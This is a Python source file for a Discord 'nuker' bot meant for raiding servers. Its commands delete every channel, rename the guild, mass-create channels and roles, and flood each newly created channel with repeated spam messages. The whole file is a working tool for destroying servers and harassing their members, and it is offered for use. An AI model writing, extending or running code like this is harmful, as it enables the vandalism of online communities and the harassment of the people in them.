import json
import requests
import discord
import time
import os
from colorama import init, Fore
from discord.ext import commands

def load_config():
    with open("config.json") as f:
        config = json.load(f)
        return config.get("PREFIX"), config.get("TOKEN"), config.get("HASH")

# # Defining main variables
prefix, token, local_hash = load_config()

def check_for_update():
    try:
        response = requests.get("https://raw.githubusercontent.com/penotrator/nuker/main/lib/config.json")
        if response.status_code == 200 or response.status_code == 204:
            remote_hash = response.text.strip()
            return remote_hash == local_hash
        else:
            print(f"{Fore.RED}[-]{Fore.RESET} Failed to check for update. Status code: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[-]{Fore.RESET} Failed to check for update. Exception: {e}")

    return False

init(autoreset=True)

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()

# Set the bot's intents and token as well as removing the built-in help command
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
bot.remove_command("help")

# Other
global thing
thing = "False"

# Checking when the bot is ready
clear()
@bot.event
async def on_ready():
    os.system(f"title Nuker - {bot.user.name}")
    print(f"{Fore.GREEN}[+]{Fore.RESET} Logged in as {bot.user.name}\n")

# Commands

@bot.command(help="Shows this help message.")
async def help(ctx):
    await ctx.message.delete()
    message = await generate_help_message(ctx)  # Pass ctx here
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+message)

async def generate_help_message(ctx):  # Include ctx parameter here
    commands_info = []
    for command in bot.commands:
        if command.help:
            command_info = {
                "name": command.name,
                "description": command.help
            }
            commands_info.append(command_info)

    message = f"Commands:\n\n"
    for command in commands_info:
        message += f"{command['name']} ━ {command['description']}\n"
    return message

@bot.command(help="Deletes all channels.")
async def delete_channels(ctx):
    await ctx.message.delete()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print(f"{Fore.CYAN}[INFO]{Fore.RESET} Started removing channels\n")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}[+]{Fore.RESET} Deleted channel: {channel}")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Failed to delete channel: {channel}")
    guild = ctx.message.guild
    await guild.create_text_channel('general')
    print("")
    print(f"{Fore.CYAN}[INFO]{Fore.RESET} Finished removing channels\n")

@bot.command(help="Sets up the bot for raiding.")
async def setup_bot(ctx):
    await ctx.message.delete()
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    global message
    global amount_of_nuker_messages_per_channel
    chan = input(f"{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
    make_roles = input(f"{Fore.YELLOW}[!]{Fore.RESET} Make roles? [y/n]: ")
    if make_roles.lower() == "y":
        rolename = input(f"{Fore.YELLOW}[!]{Fore.RESET} Role name: ")
    guildname = input(f"{Fore.YELLOW}[!]{Fore.RESET} Guild name: ")
    message = input(f"{Fore.YELLOW}[!]{Fore.RESET} Message: ")
    amount_of_channels = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of channels/roles: "))
    amount_of_nuker_messages_per_channel = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of messages per channel: "))
    delete_channels = input(f"{Fore.YELLOW}[!]{Fore.RESET} Delete channels? [y/n]: ")

    print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    global thing
    thing = "True"
    await ctx.guild.edit(name=guildname)

    if delete_channels.lower() == "y":
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} An error occurred when deleting channels | {e}")
            pass

    for i in range(amount_of_channels):
        await ctx.guild.create_text_channel(chan)
        if make_roles == "y":
            await ctx.guild.create_role(name=rolename)
            print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename}")

@bot.event
async def on_guild_channel_create(channel):
    global thing
    if thing == "True":
        for i in range(amount_of_nuker_messages_per_channel):
            try:
                t = time.localtime()
                # currenttime = time.strftime("%H:%M", t)
                count = i + 1
                print(f"{Fore.GREEN}[+]{Fore.RESET} Message sent {channel.id}")
                await channel.send(message)
            except Exception as e:
                print(f"{Fore.RED}[-]{Fore.RESET} An error occurred | {e}")
        thing = "False"
    else:
        pass

if __name__ == "__main__":
    if check_for_update():
        pass
    else:
        print(f"{Fore.YELLOW}[!]{Fore.RESET} There is a newer version of the bot available. Please update.\n")
    bot.run(token)
